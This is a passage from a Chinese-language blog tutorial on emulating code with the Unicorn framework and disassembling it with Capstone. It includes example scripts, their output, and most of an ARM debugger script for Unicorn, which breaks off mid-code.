C:\Users\v5le0n9\Desktop&gt; python unicorn.py</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;unicorn.py&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    from unicorn import *</span><br><span class="line">  File &quot;C:\Users\v5le0n9\Desktop\unicorn.py&quot;, line 2, in &lt;module&gt;</span><br><span class="line">    from unicorn.x86_const import *</span><br><span class="line">ModuleNotFoundError: No module named &#x27;unicorn.x86_const&#x27;; &#x27;unicorn&#x27; is not a package</span><br><span class="line">PS C:\Users\v5le0n9\Desktop&gt;</span><br></pre></td></tr></table></figure><p>运行错误，这里是一个点，不能将测试文件命名为<code>unicorn.py</code>，因为Unicorn模块中就有一个PY文件叫<code>unicorn.py</code>，导致文件冲突。此时应该修改测试文件名，再次运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python unicorn_test.py</span><br><span class="line">&gt;&gt;&gt; ecx: 0</span><br><span class="line">&gt;&gt;&gt; edx: 0</span><br><span class="line">&gt;&gt;&gt; ecx: 4660</span><br><span class="line">&gt;&gt;&gt; edx: 30864</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x1000000, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; ecx: 4661</span><br><span class="line">&gt;&gt;&gt; edx: 30863</span><br></pre></td></tr></table></figure><h2 id="2-2-Capstone反汇编"><a href="#2-2-Capstone反汇编" class="headerlink" title="2.2 Capstone反汇编"></a>2.2 Capstone反汇编</h2><p>Unicorn 并没有反汇编功能，虽然它的内部一定有与反汇编相关的代码。我们只能自己想办法反汇编。Unicorn 有一个兄弟，它叫Capstone。Capstone是一款支持多种处理器和开发语言的反汇编框架。我将使用Capstone 作为调试模块的反汇编器。</p><p>Capstone安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install capstone</span><br></pre></td></tr></table></figure><h3 id="2-2-1-Capstone例子"><a href="#2-2-1-Capstone例子" class="headerlink" title="2.2.1 Capstone例子"></a>2.2.1 Capstone例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone.arm <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">CODE = <span class="string">b&quot;\xf1\x02\x03\x0e\x00\x00\xa0\xe3\x02\x30\xc1\xe7\x00\x00\x53\xe3&quot;</span></span><br><span class="line"> </span><br><span class="line">md = Cs(CS_ARCH_ARM, CS_MODE_ARM)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE, <span class="number">0x1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\v5le0n9\Desktop&gt;python capstone_test.py</span><br><span class="line">1000:   mcreq   p2, #0, r0, c3, c1, #7</span><br><span class="line">1004:   mov     r0, #0</span><br><span class="line">1008:   strb    r3, [r1, r2]</span><br><span class="line">100c:   cmp     r3, #0</span><br></pre></td></tr></table></figure><h3 id="2-2-2-UnicornDebbuger调试器"><a href="#2-2-2-UnicornDebbuger调试器" class="headerlink" title="2.2.2 UnicornDebbuger调试器"></a>2.2.2 UnicornDebbuger调试器</h3><p>无名大佬写的调试器，直接拿来用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> arm_const</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> capstone <span class="keyword">as</span> cp</span><br><span class="line"> </span><br><span class="line">BPT_EXECUTE = <span class="number">1</span></span><br><span class="line">BPT_MEMREAD = <span class="number">2</span></span><br><span class="line">UDBG_MODE_ALL = <span class="number">1</span></span><br><span class="line">UDBG_MODE_FAST = <span class="number">2</span></span><br><span class="line"> </span><br><span class="line">REG_ARM = &#123;arm_const.UC_ARM_REG_R0: <span class="string">&quot;R0&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R1: <span class="string">&quot;R1&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R2: <span class="string">&quot;R2&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R3: <span class="string">&quot;R3&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R4: <span class="string">&quot;R4&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R5: <span class="string">&quot;R5&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R6: <span class="string">&quot;R6&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R7: <span class="string">&quot;R7&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R8: <span class="string">&quot;R8&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R9: <span class="string">&quot;R9&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R10: <span class="string">&quot;R10&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R11: <span class="string">&quot;R11&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R12: <span class="string">&quot;R12&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R13: <span class="string">&quot;R13&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R14: <span class="string">&quot;R14&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_R15: <span class="string">&quot;R15&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_PC: <span class="string">&quot;PC&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_SP: <span class="string">&quot;SP&quot;</span>,</span><br><span class="line">           arm_const.UC_ARM_REG_LR: <span class="string">&quot;LR&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line"> </span><br><span class="line">REG_TABLE = &#123;UC_ARCH_ARM: REG_ARM&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2int</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">if</span> s.startswith(<span class="string">&#x27;0x&#x27;</span>) <span class="keyword">or</span> s.startswith(<span class="string">&quot;0X&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(s[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">advance_dump</span>(<span class="params">data, base</span>):</span><br><span class="line">    PY3K = sys.version_info &gt;= (<span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    generator = hexdump.genchunks(data, <span class="number">16</span>)</span><br><span class="line">    retstr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> addr, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(generator):</span><br><span class="line">        <span class="comment"># 00000000:</span></span><br><span class="line">        line = <span class="string">&#x27;%08X: &#x27;</span> % (base + addr * <span class="number">16</span>)</span><br><span class="line">        <span class="comment"># 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00</span></span><br><span class="line">        dumpstr = hexdump.dump(d)</span><br><span class="line">        line += dumpstr[:<span class="number">8</span> * <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &gt; <span class="number">8</span>:  <span class="comment"># insert separator if needed</span></span><br><span class="line">            line += <span class="string">&#x27; &#x27;</span> + dumpstr[<span class="number">8</span> * <span class="number">3</span>:]</span><br><span class="line">        <span class="comment"># ................</span></span><br><span class="line">        <span class="comment"># calculate indentation, which may be different for the last line</span></span><br><span class="line">        pad = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &lt; <span class="number">16</span>:</span><br><span class="line">            pad += <span class="number">3</span> * (<span class="number">16</span> - <span class="built_in">len</span>(d))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(d) &lt;= <span class="number">8</span>:</span><br><span class="line">            pad += <span class="number">1</span></span><br><span class="line">        line += <span class="string">&#x27; &#x27;</span> * pad</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> byte <span class="keyword">in</span> d:</span><br><span class="line">            <span class="comment"># printable ASCII range 0x20 to 0x7E</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> PY3K:</span><br><span class="line">                byte = <span class="built_in">ord</span>(byte)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0x20</span> &lt;= byte &lt;= <span class="number">0x7E</span>:</span><br><span class="line">                line += <span class="built_in">chr</span>(byte)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line += <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        retstr += line + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> retstr</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_trace</span>(<span class="params">mu, address, size, self</span>):</span><br><span class="line"> </span><br><span class="line">    self._tracks.append(address)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self._is_step <span class="keyword">and</span> self._tmp_bpt == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> address <span class="keyword">not</span> <span class="keyword">in</span> self._list_bpt:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> self._tmp_bpt != address <span class="keyword">and</span> self._tmp_bpt != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> _dbg_trace_internal(mu, address, size, self)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_memory</span>(<span class="params">mu, access, address, length, value, self</span>):</span><br><span class="line">    pc = mu.reg_read(arm_const.UC_ARM_REG_PC)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;memory error: pc: %x access: %x address: %x length: %x value: %x&quot;</span> %</span><br><span class="line">                 (pc, access, address, length, value))</span><br><span class="line">    _dbg_trace_internal(mu, pc, <span class="number">4</span>, self)</span><br><span class="line">    mu.emu_stop()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_dbg_trace_internal</span>(<span class="params">mu, address, size, self</span>):</span><br><span class="line"> </span><br><span class="line">    self._is_step = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;======================= Registers =======================&quot;</span>)</span><br><span class="line">    self.dump_reg()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">    self.dump_asm(address, size * self.dis_count)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        raw_command = <span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> raw_command == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_command = self._last_command</span><br><span class="line">        self._last_command = raw_command</span><br><span class="line">        command = []</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> raw_command.split(<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> c != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                command.append(c)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> command[<span class="number">0</span>] == <span class="string">&#x27;set&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;reg&#x27;</span>:<span class="comment"># set reg regname value</span></span><br><span class="line">                    self.write_reg(command[<span class="number">2</span>], str2int(command[<span class="number">3</span>]))</span><br><span class="line">                <span class="keyword">elif</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.add_bpt(str2int(command[<span class="number">2</span>]))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error]command error see help.&quot;</span>)</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;s&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;step&#x27;</span>:</span><br><span class="line">                <span class="comment"># self._tmp_bpt = address + size</span></span><br><span class="line">                self._tmp_bpt = <span class="number">0</span></span><br><span class="line">                self._is_step = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;n&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;next&#x27;</span>:</span><br><span class="line">                self._tmp_bpt = address + size</span><br><span class="line">                self._is_step = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;r&#x27;</span> <span class="keyword">or</span> command[<span class="number">0</span>] == <span class="string">&#x27;run&#x27;</span>:</span><br><span class="line">                self._tmp_bpt = <span class="number">0</span></span><br><span class="line">                self._is_step = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;dump&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(command) &gt;= <span class="number">3</span>:</span><br><span class="line">                    nsize = str2int(command[<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    nsize = <span class="number">4</span> * <span class="number">16</span></span><br><span class="line">                self.dump_mem(str2int(command[<span class="number">1</span>]), nsize)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.list_bpt()</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> command[<span class="number">1</span>] == <span class="string">&#x27;bpt&#x27;</span>:</span><br><span class="line">                    self.del_bpt(str2int(command[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>]==<span class="string">&#x27;stop&#x27;</span>:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                self._castone = self._capstone_thumb</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">                self._castone = self._capstone_arm</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;======================= Disassembly =====================&quot;</span>)</span><br><span class="line">                self.dump_asm(address, size * self.dis_count)</span><br><span class="line">            <span class="keyword">elif</span> command[<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot; == recent ==&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> self._tracks[-<span class="number">10</span>:-<span class="number">1</span>]:</span><br><span class="line">                    <span class="built_in">print</span> (self.sym_handler(i))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;Command Not Found!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[Debugger Error]command error see help.&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UnicornDebugger</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, mu, mode = UDBG_MODE_ALL</span>):</span><br><span class="line">        self._tracks = []</span><br><span class="line">        self._mu = mu</span><br><span class="line">        self._arch = mu._arch</span><br><span class="line">        self._mode = mu._mode</span><br><span class="line">        self._list_bpt = []</span><br><span class="line">        self._tmp_bpt = <span class="number">0</span></span><br><span class="line">        self._error = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self._last_command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.dis_count = <span class="number">5</span></span><br><span class="line">        self._is_step = <span class="literal">False</span></span><br><span class="line">        self.sym_handler = self._default_sym_handler</span><br><span class="line">        self._capstone_arm = <span class="literal">None</span></span><br><span class="line">        self._capstone_thumb = <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._arch != UC_ARCH_ARM:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;arch:%d is not supported! &quot;</span> % self._arch)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._arch == UC_ARCH_ARM:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_ARM</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_ARM64:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_ARM64</span><br><span class="line">        <span class="keyword">elif</span> self._arch == UC_ARCH_X86:</span><br><span class="line">            capstone_arch = cp.CS_ARCH_X86</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;arch:%d is not supported! &quot;</span> % self._arch)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self._mode == UC_MODE_THUMB:</span><br><span class="line">            capstone_mode = cp.CS_MODE_THUMB</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_ARM:</span><br><span class="line">            capstone_mode = cp.CS_MODE_ARM</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_32:</span><br><span class="line">            capstone_mode = cp.CS_MODE_32</span><br><span class="line">        <span class="keyword">elif</span> self._mode == UC_MODE_64:</span><br><span class="line">            capstone_mode = cp.CS_MODE_64</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.emu_stop()</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;mode:%d is not supported! &quot;</span> % self._mode)</span><br><span class="line"> </span><br><span class="line">        self._capstone_thumb = cp.Cs(cp.CS_ARCH_ARM, cp.CS_MODE_THUMB)</span><br><span class="line">        self._capstone_arm = cp.Cs(cp.CS_ARCH_ARM, cp.CS_MODE_ARM)</span><br><span class="line"> </span><br><span class="line">        self._capstone = self._capstone_thumb</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> mode == UDBG_MODE_ALL:</span><br><span class="line">            mu.hook_add(UC_HOOK_CODE, _dbg_trace, self)</span><br><span class="line"> </span><br><span class="line">        mu.hook_add(UC_HOOK_MEM_UNMAPPED, _dbg_memory, self)</span><br><span class="line">        mu.hook_add(UC_HOOK_MEM_FETCH_PROT, _dbg_memory, self)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        self._regs = REG_TABLE[self._arch]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_mem</span>(<span class="params">self, addr, size</span>):</span><br><span class="line">        data = self._mu.mem_read(addr, size)</span><br><span class="line">        <span class="built_in">print</span> (advance_dump(data, addr))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_asm</span>(<span class="params">self, addr, size</span>):</span><br><span class="line">        md = self._capstone</span><br><span class="line">        code = self._mu.mem_read(addr, size)</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ins <span class="keyword">in</span> md.disasm(code, addr):</span><br><span class="line">            <span class="keyword">if</span> count &gt;= self.dis_count:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%s:\t%s\t%s&quot;</span> % (self.sym_handler(ins.address), ins.mnemonic, ins.op_str))</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dump_reg</span>(<span class="params">self</span>):</span><br><span class="line">        result_format = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> self._regs:</span><br><span class="line">            rname = self._regs[rid]</span><br><span class="line">            value = self._mu.reg_read(rid)</span><br><span class="line">            <span class="keyword">if</span> count &lt; <span class="number">4</span>:</span><br><span class="line">                result_format += rname + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">hex</span>(value) + <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count = <span class="number">1</span></span><br><span class="line">                result_format += <span class="string">&#x27;\n&#x27;</span> + rname + <span class="string">&#x27;=&#x27;</span> + <span class="built_in">hex</span>(value) + <span class="string">&#x27;\t&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (result_format)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">self, reg_name, value</span>):</span><br><span class="line">        <span class="keyword">for</span> rid <span class="keyword">in</span> self._regs:</span><br><span class="line">            rname = self._regs[rid]</span><br><span class="line">            <span class="keyword">if</span> rname == reg_name:</span><br><span class="line">                self._mu.reg_write(rid, value)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;[Debugger Error] Reg not found:%s &quot;</span> % reg_name)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_help</span>(<span class="params">self</span>):</span><br><span class="line">        help_info = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        # 